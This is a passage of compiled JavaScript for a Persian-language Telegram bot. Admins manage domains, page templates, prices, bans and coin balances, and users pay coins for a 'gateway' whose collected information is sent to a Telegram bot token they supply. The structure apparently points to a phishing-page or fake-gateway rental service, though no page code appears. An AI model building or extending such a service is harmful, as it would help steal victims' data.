                                        reply_to_message_id: message.message_id
                                    })];
                            }
                            return [2 /*return*/];
                        });
                    }); })];
            case 29:
                _a.sent();
                _a.label = 30;
            case 30: return [3 /*break*/, 52];
            case 31:
                if (!(userstep === "deldomain")) return [3 /*break*/, 36];
                if (!(message.text.length !== 0)) return [3 /*break*/, 35];
                if (!/^https?:\/\/(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?::\d{1,5})?(?:\/[^\s]*)?$/.test(message.text)) return [3 /*break*/, 33];
                got.delete(message.from.id);
                _url = new URL(message.text);
                return [4 /*yield*/, domaindb.getDomainByDURL(_url.origin, function (data) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!data) {
                                        return [2 /*return*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | \u0647\u0645\u0686\u06CC\u0646 \u062F\u0627\u0645\u06CC\u0646\u06CC \u0648\u062C\u0648\u062F \u0646\u062F\u0627\u0631\u0647", {
                                                reply_to_message_id: message.message_id
                                            })];
                                    }
                                    return [4 /*yield*/, domaindb.removeDomain(data.id, function (datax) { return __awaiter(void 0, void 0, void 0, function () {
                                            var _a;
                                            return __generator(this, function (_b) {
                                                switch (_b.label) {
                                                    case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "".concat(datax.status === true ? '✅' : '🔴', " | ").concat((_a = datax.message) !== null && _a !== void 0 ? _a : "دامین با موفقیت حذف شد"), {
                                                            reply_to_message_id: message.message_id
                                                        })];
                                                    case 1: return [2 /*return*/, _b.sent()];
                                                }
                                            });
                                        }); })];
                                case 1:
                                    _a.sent();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            case 32:
                _a.sent();
                return [3 /*break*/, 35];
            case 33: return [4 /*yield*/, domaindb.getDomainByID(message.text, function (data) { return __awaiter(void 0, void 0, void 0, function () {
                    return __generator(this, function (_a) {
                        switch (_a.label) {
                            case 0:
                                if (!data) {
                                    return [2 /*return*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | \u0647\u0645\u0686\u06CC\u0646 \u062F\u0627\u0645\u06CC\u0646\u06CC \u0648\u062C\u0648\u062F \u0646\u062F\u0627\u0631\u0647", {
                                            reply_to_message_id: message.message_id
                                        })];
                                }
                                return [4 /*yield*/, domaindb.removeDomain(data.id, function (datax) { return __awaiter(void 0, void 0, void 0, function () {
                                        var _a;
                                        return __generator(this, function (_b) {
                                            switch (_b.label) {
                                                case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "".concat(datax.status === true ? '✅' : '🔴', " | ").concat((_a = datax.message) !== null && _a !== void 0 ? _a : "دامین با موفقیت حذف شد"), {
                                                        reply_to_message_id: message.message_id
                                                    })];
                                                case 1: return [2 /*return*/, _b.sent()];
                                            }
                                        });
                                    }); })];
                            case 1:
                                _a.sent();
                                return [2 /*return*/];
                        }
                    });
                }); })];
            case 34:
                _a.sent();
                _a.label = 35;
            case 35: return [3 /*break*/, 52];
            case 36:
                if (!(userstep === "addskin")) return [3 /*break*/, 38];
                if (message.text.length === 0) {
                    return [2 /*return*/];
                }
                return [4 /*yield*/, domaindb.getDomainByID(message.text, function (dom) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!dom) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u062F\u0627\u0645\u06CC\u0646 \u0627\u0634\u062A\u0628\u0627\u0647 \u0647\u0633\u062A", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    opt.set(message.from.id, { domain_id: message.text });
                                    got.set(message.from.id, "getskinnameforadd");
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u0627\u0633\u0645 \u0642\u0627\u0644\u0628 \u0631\u0648 \u0627\u0631\u0633\u0627\u0644 \u06A9\u0646\u06CC\u062F (\u0628\u0647 \u0647\u0645\u0631\u0627\u0647 \u067E\u0633\u0648\u0646\u062F)", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 3: return [2 /*return*/, _a.sent()];
                            }
                        });
                    }); })];
            case 37:
                _a.sent();
                return [3 /*break*/, 52];
            case 38:
                if (!(userstep === "getskinnameforadd")) return [3 /*break*/, 40];
                if (message.text.length === 0) {
                    return [2 /*return*/];
                }
                return [4 /*yield*/, domaindb.getDomainByID(opt.get(message.from.id).domain_id, function (dom) { return __awaiter(void 0, void 0, void 0, function () {
                        var xpath;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!dom) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u062F\u0627\u0645\u06CC\u0646 \u062D\u0630\u0641 \u0634\u062F\u0647", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    xpath = path.parse(message.text);
                                    if (!dom.contains.includes(xpath.name)) return [3 /*break*/, 4];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u0627\u06CC\u0646 \u0642\u0627\u0644\u0628 \u0642\u0628\u0644\u0627 \u0633\u062A \u0634\u062F\u0647", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 3: return [2 /*return*/, _a.sent()];
                                case 4: return [4 /*yield*/, domaindb.addContainer(xpath.name, dom.id, function () { return __awaiter(void 0, void 0, void 0, function () { return __generator(this, function (_a) {
                                        return [2 /*return*/];
                                    }); }); })];
                                case 5:
                                    _a.sent();
                                    got.delete(message.from.id);
                                    opt.delete(message.from.id);
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u2705 \u0642\u0627\u0644\u0628 \u0628\u0627 \u0645\u0648\u0641\u0642\u06CC\u062A \u0627\u0636\u0627\u0641\u0647 \u0634\u062F", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 6: return [2 /*return*/, _a.sent()];
                            }
                        });
                    }); })];
            case 39:
                _a.sent();
                return [3 /*break*/, 52];
            case 40:
                if (!(userstep === "delskin")) return [3 /*break*/, 42];
                if (message.text.length === 0) {
                    return [2 /*return*/];
                }
                return [4 /*yield*/, domaindb.getDomainByID(message.text, function (dom) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!dom) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u062F\u0627\u0645\u06CC\u0646 \u0627\u0634\u062A\u0628\u0627\u0647 \u0647\u0633\u062A", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    opt.set(message.from.id, { domain_id: message.text });
                                    got.set(message.from.id, "getskinnamefordel");
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u0627\u0633\u0645 \u0642\u0627\u0644\u0628 \u0631\u0648 \u0627\u0631\u0633\u0627\u0644 \u06A9\u0646\u06CC\u062F (\u0628\u062F\u0648\u0646 \u067E\u0633\u0648\u0646\u062F)", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 3: return [2 /*return*/, _a.sent()];
                            }
                        });
                    }); })];
            case 41:
                _a.sent();
                return [3 /*break*/, 52];
            case 42:
                if (!(userstep === "getskinnamefordel")) return [3 /*break*/, 44];
                if (message.text.length === 0) {
                    return [2 /*return*/];
                }
                return [4 /*yield*/, domaindb.getDomainByID(opt.get(message.from.id).domain_id, function (dom) { return __awaiter(void 0, void 0, void 0, function () {
                        var xpath;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!dom) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u062F\u0627\u0645\u06CC\u0646 \u062D\u0630\u0641 \u0634\u062F\u0647", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    xpath = path.parse(message.text);
                                    if (!!dom.contains.includes(xpath.name)) return [3 /*break*/, 4];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u0642\u0627\u0644\u0628\u06CC \u0628\u0627 \u0627\u06CC\u0646 \u0627\u0633\u0645 \u0648\u062C\u0648\u062F \u0646\u062F\u0627\u0631\u0647", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 3: return [2 /*return*/, _a.sent()];
                                case 4: return [4 /*yield*/, domaindb.removeContainer(xpath.name, dom.id, function () { return __awaiter(void 0, void 0, void 0, function () { return __generator(this, function (_a) {
                                        return [2 /*return*/];
                                    }); }); })];
                                case 5:
                                    _a.sent();
                                    return [4 /*yield*/, axios.post(dom.durl + "/remove-skin", { skin: xpath.name }).then(function () { })];
                                case 6:
                                    _a.sent();
                                    got.delete(message.from.id);
                                    opt.delete(message.from.id);
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u2705 \u0642\u0627\u0644\u0628 \u0628\u0627 \u0645\u0648\u0641\u0642\u06CC\u062A \u062D\u0630\u0641 \u0634\u062F", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 7: return [2 /*return*/, _a.sent()];
                            }
                        });
                    }); })];
            case 43:
                _a.sent();
                return [3 /*break*/, 52];
            case 44:
                if (!(userstep === "changeprice")) return [3 /*break*/, 46];
                if (!/^\d+$/.test(message.text)) {
                    return [2 /*return*/];
                }
                got.delete(message.from.id);
                price = parseInt(message.text);
                return [4 /*yield*/, fs.promises.writeFile(path.join(__dirname, "price.txt"), "".concat(price), { flag: 'w' }).then(function () { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u2705 \u0642\u06CC\u0645\u062A \u062F\u0631\u06AF\u0627\u0647 \u0647\u0627 \u0628\u0647 ".concat(message.text, " \u062A\u063A\u06CC\u06CC\u0631 \u06CC\u0627\u0641\u062A"), {
                                        reply_to_message_id: message.message_id
                                    })];
                                case 1: return [2 /*return*/, _a.sent()];
                            }
                        });
                    }); }).catch(function (e) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 ".concat(e), {
                                        reply_to_message_id: message.message_id
                                    })];
                                case 1: return [2 /*return*/, _a.sent()];
                            }
                        });
                    }); })];
            case 45:
                _a.sent();
                return [3 /*break*/, 52];
            case 46:
                if (!(userstep === "freecoins")) return [3 /*break*/, 48];
                if (!/^\d+$/.test(message.text)) {
                    return [2 /*return*/];
                }
                got.set(message.from.id, "getuserffreecoins");
                cns.set(message.from.id, { coins: parseInt(message.text) });
                return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDC64 \u0622\u06CC\u062F\u06CC \u0639\u062F\u062F\u06CC \u0641\u0631\u062F \u0645\u0648\u0631\u062F \u0646\u0638\u0631 \u0631\u0648 \u0627\u0631\u0633\u0627\u0644 \u06A9\u0646\u06CC\u062F", {
                        reply_to_message_id: message.message_id
                    })];
            case 47: return [2 /*return*/, _a.sent()];
            case 48:
                if (!(userstep === "getuserffreecoins")) return [3 /*break*/, 52];
                if (!/^\d+$/.test(message.text)) {
                    return [2 /*return*/];
                }
                if (!!cns.has(message.from.id)) return [3 /*break*/, 50];
                return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u067E\u0631\u0648\u0633\u0647 \u0627\u06CC \u06CC\u0627\u0641\u062A \u0646\u0634\u062F", {
                        reply_to_message_id: message.message_id
                    })];
            case 49: return [2 /*return*/, _a.sent()];
            case 50:
                coins = cns.get(message.from.id);
                cns.delete(message.from.id);
                return [4 /*yield*/, userdb.charge(message.from.id, coins.coins, function (datax) { return __awaiter(void 0, void 0, void 0, function () {
                        var _a;
                        return __generator(this, function (_b) {
                            switch (_b.label) {
                                case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "".concat(datax.status === true ? '✅' : '🔴', " | ").concat((_a = datax.message) !== null && _a !== void 0 ? _a : "".concat(message.text, " \u0633\u06A9\u0647 \u0631\u06CC\u062E\u062A\u0647 \u0634\u062F")), {
                                        reply_to_message_id: message.message_id
                                    })];
                                case 1: return [2 /*return*/, _b.sent()];
                            }
                        });
                    }); })];
            case 51:
                _a.sent();
                _a.label = 52;
            case 52: return [2 /*return*/];
        }
    });
}); });
bot.on("callback_query", function (call) { return __awaiter(void 0, void 0, void 0, function () {
    var real_message, spl, uid, mode, _a, _domainid_1, skin, qdata_1;
    var _b;
    return __generator(this, function (_c) {
        switch (_c.label) {
            case 0:
                if (!call.from)
                    return [2 /*return*/];
                if (!call.data)
                    return [2 /*return*/];
                if (!call.message)
                    return [2 /*return*/];
                real_message = call.message;
                spl = (_b = call.data.split("_")) !== null && _b !== void 0 ? _b : [];
                uid = parseInt(spl[1]);
                mode = spl[0];
                if (!(call.from.id === uid)) return [3 /*break*/, 26];
                _a = mode;
                switch (_a) {
                    case "buy": return [3 /*break*/, 1];
                    case "add": return [3 /*break*/, 2];
                    case "addskinformoshtari": return [3 /*break*/, 4];
                    case "ban": return [3 /*break*/, 6];
                    case "unban": return [3 /*break*/, 8];
                    case "brcast": return [3 /*break*/, 10];
                    case "adddomain": return [3 /*break*/, 12];
                    case "deldomain": return [3 /*break*/, 14];
                    case "addskin": return [3 /*break*/, 16];
                    case "delskin": return [3 /*break*/, 18];
                    case "changeprice": return [3 /*break*/, 20];
                    case "freecoins": return [3 /*break*/, 22];
                    case "cdomains": return [3 /*break*/, 24];
                }
                return [3 /*break*/, 26];
            case 1:
                userdb.getUserById(call.from.id, function (user) {
                    if (!user) {
                        return bot.answerCallbackQuery(call.id, {
                            text: "اول بات رو استارت کنید",
                            show_alert: true
                        });
                    }
                    if (user.ban) {
                        return bot.answerCallbackQuery(call.id, {
                            text: "متاسفانه شما بن شده اید",
                            show_alert: true
                        });
                    }
                    domaindb.getDomains(function (domains) {
                        var _endpoints = new Map();
                        if (que.has(call.from.id)) {
                            que.delete(call.from.id);
                        }
                        for (var _i = 0, domains_2 = domains; _i < domains_2.length; _i++) {
                            var _dom = domains_2[_i];
                            try {
                                var theurl = new URL(_dom.durl);
                                var orgspl = theurl.origin.split(".");
                                _endpoints.set(_dom.id, {
                                    endpoint: orgspl[orgspl.length - 1],
                                    href: theurl.href
                                });
                            }
                            catch (err) {
                                console.error("Invalid URL:", _dom.durl, err);
                            }
                        }
                        var thok = [];
                        _endpoints.forEach(function (info, _id) {
                            thok.push({
                                text: info.endpoint.length !== 0 ? info.endpoint : info.href,
                                callback_data: "add_".concat(call.from.id, "_").concat(_id)
                            });
                        });
                        var chunked = chunkArray(thok, 2);
                        bot.editMessageText("\uD83E\uDE92 | \u062F\u0631\u06CC\u0627\u0641\u062A \u062F\u0631\u06AF\u0627\u0647 \u0647\u0627\u06CC \u0645\u0648\u062C\u0648\u062F\n\n\u26A0\uFE0F | \u0686\u0648\u0646 \u0628\u0627\u062A \u0628\u0647 api \u0648\u0635\u0644\u0647 \u0642\u06CC\u0645\u062A \u0647\u0627 \u0630\u0631\u0647 \u0627\u06CC \u06A9\u0645\u062A\u0631 \u0642\u0628\u0648\u0644 \u0646\u0645\u06CC\u0634\u0646, \u067E\u0633 \u06A9\u0627\u0645\u0644 \u067E\u0648\u0644 \u0631\u0648 \u0648\u0627\u0631\u06CC\u0632 \u06A9\u0646\u06CC\u062F", {
                            chat_id: real_message.chat.id,
                            message_id: real_message.message_id,
                            reply_markup: { inline_keyboard: chunked }
                        }).catch(function (err) { return console.log("EDIT MESSAGE ERROR:", err); });
                    });
                });
                return [3 /*break*/, 26];
            case 2:
                _domainid_1 = spl[2];
                return [4 /*yield*/, userdb.getUserById(call.from.id, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!user) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                                            text: "اول بات رو استارت کنید",
                                            show_alert: true
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    if (!user.ban) return [3 /*break*/, 4];
                                    return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                                            text: "متاسفانه شما بن شده اید",
                                            show_alert: true
                                        })];
                                case 3: return [2 /*return*/, _a.sent()];
                                case 4: return [4 /*yield*/, domaindb.getDomainByID(_domainid_1, function (dom) { return __awaiter(void 0, void 0, void 0, function () {
                                        var items, _i, _a, inc, chuncked;
                                        return __generator(this, function (_b) {
                                            switch (_b.label) {
                                                case 0:
                                                    if (!!dom) return [3 /*break*/, 2];
                                                    return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                                                            text: "🔴 دامینی یافت نشد",
                                                            show_alert: true
                                                        })];
                                                case 1: return [2 /*return*/, _b.sent()];
                                                case 2:
                                                    que.set(call.from.id, { domain_id: _domainid_1 });
                                                    items = [];
                                                    for (_i = 0, _a = dom.contains; _i < _a.length; _i++) {
                                                        inc = _a[_i];
                                                        items.push({ text: inc, callback_data: "addskinformoshtari_".concat(call.from.id, "_").concat(inc) });
                                                    }
                                                    chuncked = chunkArray(items, 2);
                                                    return [4 /*yield*/, bot.editMessageText('🔺 قالبی رو انتخاب کنید', {
                                                            chat_id: real_message.chat.id,
                                                            message_id: real_message.message_id,
                                                            reply_markup: {
                                                                inline_keyboard: chuncked
                                                            }
                                                        })];
                                                case 3: return [2 /*return*/, _b.sent()];
                                            }
                                        });
                                    }); })];
                                case 5:
                                    _a.sent();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            case 3:
                _c.sent();
                return [3 /*break*/, 26];
            case 4:
                skin = spl[2];
                qdata_1 = que.get(call.from.id);
                console.log(qdata_1);
                qdata_1.skin = skin;
                que.set(call.from.id, qdata_1);
                return [4 /*yield*/, userdb.getUserById(call.from.id, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!user) return [3 /*break*/, 2];
                                    que.delete(call.from.id);
                                    return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                                            text: "اول بات رو استارت کنید",
                                            show_alert: true
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    if (!user.ban) return [3 /*break*/, 4];
                                    que.delete(call.from.id);
                                    return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                                            text: "متاسفانه شما بن شده اید",
                                            show_alert: true
                                        })];
                                case 3: return [2 /*return*/, _a.sent()];
                                case 4:
                                    if (!(user.coins < price)) return [3 /*break*/, 6];
                                    que.delete(call.from.id);
                                    return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                                            text: "حساب شما کافی نیست",
                                            show_alert: true
                                        })];
                                case 5: return [2 /*return*/, _a.sent()];
                                case 6: return [4 /*yield*/, domaindb.getDomainByID(qdata_1.domain_id, function (domain) { return __awaiter(void 0, void 0, void 0, function () {
                                        return __generator(this, function (_a) {
                                            switch (_a.label) {
                                                case 0:
                                                    if (!!domain) return [3 /*break*/, 2];
                                                    return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                                                            text: "🔴 دامینی یافت نشد",
                                                            show_alert: true
                                                        })];
                                                case 1: return [2 /*return*/, _a.sent()];
                                                case 2: return [4 /*yield*/, userdb.decharge(call.from.id, price, function () { })];
                                                case 3:
                                                    _a.sent();
                                                    got.set(call.from.id, "gettoken");
                                                    return [4 /*yield*/, bot.editMessageText("🤖 | توکن ربات جهت ارسال اطلاعات رو ارسال کنید", {
                                                            chat_id: real_message.chat.id,
                                                            message_id: real_message.message_id
                                                        })];
                                                case 4: return [2 /*return*/, _a.sent()];
                                            }
                                        });
                                    }); })];
                                case 7:
                                    _a.sent();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            case 5:
                _c.sent();
                return [3 /*break*/, 26];
            case 6:
                got.set(call.from.id, "banuser");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "آیدی عددی مورد نظر یا پورت مورد نظر رو ارسال کنید",
                        show_alert: true
                    })];
            case 7:
                _c.sent();
                return [3 /*break*/, 26];
            case 8:
                got.set(call.from.id, "unbanuser");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "آیدی عددی مورد نظر یا پورت مورد نظر رو ارسال کنید",
                        show_alert: true
                    })];
            case 9:
                _c.sent();
                return [3 /*break*/, 26];
            case 10:
                got.set(call.from.id, "brdcastmessage");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "پیامی رو ارسال کن",
                        show_alert: true
                    })];
            case 11:
                _c.sent();
                return [3 /*break*/, 26];
            case 12:
                got.set(call.from.id, "adddomain");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "لینک دامین رو ارسال بکن",
                        show_alert: true
                    })];
            case 13:
                _c.sent();
                return [3 /*break*/, 26];
            case 14:
                got.set(call.from.id, "deldomain");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "لینک دامین یا آیدی دامین رو ارسال بکن",
                        show_alert: true
                    })];
            case 15:
                _c.sent();
                return [3 /*break*/, 26];
            case 16:
                got.set(call.from.id, "addskin");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "آیدی دامین رو ارسال بکن",
                        show_alert: true
                    })];
            case 17:
                _c.sent();
                return [3 /*break*/, 26];
            case 18:
                got.set(call.from.id, "delskin");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "آیدی دامین رو ارسال بکن",
                        show_alert: true
                    })];
            case 19:
                _c.sent();
                return [3 /*break*/, 26];
            case 20:
                got.set(call.from.id, "changeprice");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "قیمت جدید رو به ترون وارد بکن",
                        show_alert: true
                    })];
            case 21:
                _c.sent();
                return [3 /*break*/, 26];
            case 22:
                got.set(call.from.id, "freecoins");
                return [4 /*yield*/, bot.answerCallbackQuery(call.id, {
                        text: "مقدار سکه هایی که حساب رو شارژ کنه",
                        show_alert: true
                    })];
            case 23:
                _c.sent();
                return [3 /*break*/, 26];
            case 24: return [4 /*yield*/, domaindb.getDomains(function (domains) { return __awaiter(void 0, void 0, void 0, function () {
                    var txt, _i, domains_3, domain, _chunk, _a, _chunk_1, ch;
                    return __generator(this, function (_b) {
                        switch (_b.label) {
                            case 0:
                                txt = "\uD83D\uDCC3 | \u062A\u0639\u062F\u0627\u062F \u062F\u0627\u0645\u06CC\u0646 \u0647\u0627 : ".concat(domains.length, "\n");
                                for (_i = 0, domains_3 = domains; _i < domains_3.length; _i++) {
                                    domain = domains_3[_i];
                                    domain.contains = domain.contains.length === 0 ? [] : domain.contains;
                                    domain.includes = domain.includes.length === 0 ? [] : domain.includes;
                                    console.log(typeof domain.includes);
                                    txt += "\n\uD83D\uDD17 | \u0644\u06CC\u0646\u06A9 : <code>".concat(domain.durl, "</code>\n\uD83D\uDCE6 | \u0642\u0627\u0644\u0628 \u0647\u0627 [ ").concat(domain.contains.length, " ] : ").concat(domain.contains.map(function (cnt) { return "<code>".concat(cnt, "</code>"); }).join(", "), "\n\uD83C\uDF00 | \u067E\u0648\u0631\u062A \u0647\u0627\u06CC \u0645\u062A\u0635\u0644 [ ").concat(domain.includes.length, " ] : ").concat(domain.includes.map(function (inc) { return "<code>".concat(inc, "</code>"); }).join(", "), "\n\uD83D\uDD2E | \u0622\u06CC\u062F\u06CC : <code>").concat(domain.id, "</code>\n\u270F\uFE0F | private key : <code>").concat(domain.private_key, "</code>\n");
                                }
                                _chunk = safeTelegramChunk(txt, 4090);
                                _a = 0, _chunk_1 = _chunk;
                                _b.label = 1;
                            case 1:
                                if (!(_a < _chunk_1.length)) return [3 /*break*/, 4];
                                ch = _chunk_1[_a];
                                return [4 /*yield*/, bot.sendMessage(real_message.chat.id, ch, {
                                        parse_mode: "HTML",
                                        reply_to_message_id: real_message.message_id
                                    })];
                            case 2:
                                _b.sent();
                                _b.label = 3;
                            case 3:
                                _a++;
                                return [3 /*break*/, 1];
                            case 4: return [2 /*return*/];
                        }
                    });
                }); })];
            case 25:
                _c.sent();
                return [3 /*break*/, 26];
            case 26: return [2 /*return*/];
        }
    });
}); });
function build(string) {
    return string.split('').map(function (char) { return translationTable[char] || char; }).join('');
}
function daysToMilliseconds(days) {
    var millisecondsInADay = 24 * 60 * 60 * 1000;
    return days * millisecondsInADay;
}
function chunkArray(array, chunkSize) {
    var result = [];
    for (var i = 0; i < array.length; i += chunkSize) {
        var chunk = array.slice(i, i + chunkSize);
        result.push(chunk);
    }
    return result;
}
function has24HoursPassed(timestamp) {
    var now = Date.now();
    var diff = now - timestamp;
    return diff >= 24 * 60 * 60 * 1000;
}
function safeTelegramChunk(text, max) {
    if (max === void 0) { max = 4000; }
    var chunks = [];
    var current = "";
    var pushChunk = function () {
        if (current.trim().length > 0)
            chunks.push(current);
        current = "";
    };
    var lines = text.split("\n");
    for (var _i = 0, lines_1 = lines; _i < lines_1.length; _i++) {
        var line = lines_1[_i];
        if ((current + line + "\n").length > max) {
            pushChunk();
        }
        current += line + "\n";
    }
    if (current.length > 0)
        pushChunk();
    return chunks;
}
